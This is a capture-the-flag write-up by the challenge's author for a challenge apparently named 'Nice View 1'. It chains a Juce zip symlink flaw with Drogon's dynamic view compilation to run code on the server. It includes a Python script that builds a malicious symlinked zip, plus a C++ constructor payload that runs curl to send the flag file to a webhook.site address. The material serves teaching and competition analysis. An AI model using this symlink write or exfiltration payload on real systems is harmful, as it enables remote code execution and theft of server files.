# Writeup: Nice View 1

*By: TrebledJ*

This is a rehash of some earlier challenges I designed for a different CTF, with the addition of Drogon's Dynamic View Loading functionality. There were a few unintendeds here, but I'll mainly focus on the intended path.

Unfortunately, regular MuseScore files were blocked, since I added some extra unintended-solution defences and forgot to test. So a large swath of players escaped yet another rick roll.

This writeup will be more brief than Malkonkordo, so let's get straight into it.

## Observations

1. Identify software used:

   - Juce 6.1.4 (fingerprint source files)
   - Drogon 1.9.1 (server header)

2. Enumerate vulnerabilities:

   - [CVE-2021-23521](https://nvd.nist.gov/vuln/detail/CVE-2021-23521) - zip symlink attack in Juce's `ZipFile::uncompressTo`/`ZipFile::uncompressEntry` function.
   - Drogon CSP Bad Bad Config
    ```json
    "load_dynamic_views": true,
    "dynamic_views_path": ["./views/d"],
    ```
    How can we know this a potential vulnerability? Because there is a [security warning in the docs](https://github.com/drogonframework/drogon/wiki/ENG-06-View#dynamic-compilation-and-loading-of-views).

3. App allows file upload of `.mscz` (compressed MuseScore) files. These files are then unzipped, parsed, and fed into a Juce synthesiser.

4. Juce 6.1.4's vulnerable `ZipFile::uncompressTo` is called in relay.hpp:

    ```cpp
    juce::Result unzipMusescoreFile(juce::File& mscx, const std::string& musescorePath)
    {
        // Check file exists...
        // Get unzip directory...
        // Check file doesn't contain ZipSlip (../../a/b/c).
        // Check file entries don't contain bad characters.
        for (int i = 0; i < mscz.getNumEntries(); i++) {
            juce::String fn = mscz.getEntry(i)->filename;

            for (char c : fn) {
                if (!(isalpha(c) || c == '/' || c == '.' || c == '-' || c == '_'))
                    return juce::Result::fail("invalid filename");
            }
        }

        // Uncompress...
        if (auto res = mscz.uncompressTo(unzipDirectory, false); !res)
            return res;

        // Blah blah blah...
    }
    ```

5. Views are dynamically returned in the `/view/{}` endpoint. But before returning, a `isViewBadBad` function is called.

    ```cpp
    app().registerHandler(
        "/view/{}",
        [](const HttpRequestPtr& req, std::function<void(const HttpResponsePtr&)>&& callback, const std::string& page) {
            logRequest(req);

            BadBadReason reason = isViewBadBad(page);
            switch (reason) {
				case FileBad: {
					// Not ok.
					break;
				}
				case FileOk: {
					// Ok.
					break;
				}
			}
    });
    ```

    `isViewBadBad` checks file size and blacklisted strings. The blacklist blocks most things such as CSP features (`$$`, `{%`, `view`, `layout`) and some C++ features (`#define`, `system()`, `execve()`), but doesn't block C++ features such as `#include`.

    But these checks can be bypassed, as we'll discover later. (Both in intended and unintended solutions.)


## Exploitation

### Exploiting Juce's Zip Symlink
[Zip symlink attack](https://trebledj.me/posts/attack-of-the-zip/#zip-symlink-attacks) to write arbitrary files to the server. There are numerous ways to craft a malicious zip: shell, Python (some ppl even used PHP!). Here's a little Python snippet I used:

```python
from stat import *
import zipfile

zipf = zipfile.ZipFile('evil.mscz', 'w', compression=zipfile.ZIP_DEFLATED)

# Configure `dir` to be symlink.
info = zipfile.ZipInfo('dir')
info.create_system = 3
info.external_attr = (stat.S_IFLNK | 0o777) << 16

zipf.writestr(info, '/app/views/d/')
zipf.write('evil.csp', f'dir/evil.csp')
zipf.close()
```

...which creates a zip resembling:

```
Archive:  evil.mscz
    Length      Date    Time    Name
---------  ---------- -----   ----
       13  01-01-1980 00:00   dir
      167  08-02-2024 00:16   dir/evil.csp
---------                     -------
      180                     2 files
```

where `dir` is a symlink to `/app/views/d/`.

### Bypassing `isViewBadBad` Checks with `.init` Section and `__attribute__((constructor))`

If you diffed Nice View 1 and Nice View 2, you would notice that the checks in Nice View 2 were performed *prior to* unzipping. In Nice View 1, the intended path was to trigger something *after unzipping*, but *without calling `/view/{}`*.

With Drogon's Dynamic Views Loading, `.csp` files are automatically compiled and loaded. This act of loading will also trigger any typical program startup features such as running functions in the `.init` section.

To do this, we can create a function with [`__attribute__((constructor))`](https://gcc.gnu.org/onlinedocs/gcc-4.1.2/gcc/Function-Attributes.html#:~:text=The%20constructor%20attribute). This allows us to bypass all the post-unzip checks, and allows us to easily run system commands.

```cpp
<%inc
void __attribute__((constructor)) init() {
    system("curl https://webhook.site/12345678-9036-4eb3-a58a-bda4f534a687?b=$(cat /app/flag.txt | base64 -w0)");
}
%>
```

There are different ways to exfiltrate the data in `/app/flag.txt`, but here, we just include it a GET parameter to an attacker-controlled site.

## Flag

```
crew{That's_quite_a_nice_view!_Dynamic_libraries_are_fun,_in'nit?_2061b82f3caf3e55df0c1d8cd}
```

Get it?

## Notable Unintendeds

### Header File Include + `/view/{}`

The CSP file can include arbitrary files using C/C++'s `#include` macro. Since only the CSP file is checked in the `/view/{}` handler, this allows us to bypass any checks in `isViewBadBad`.

Solution: Blacklist `include` (and other potential file inclusion macros).
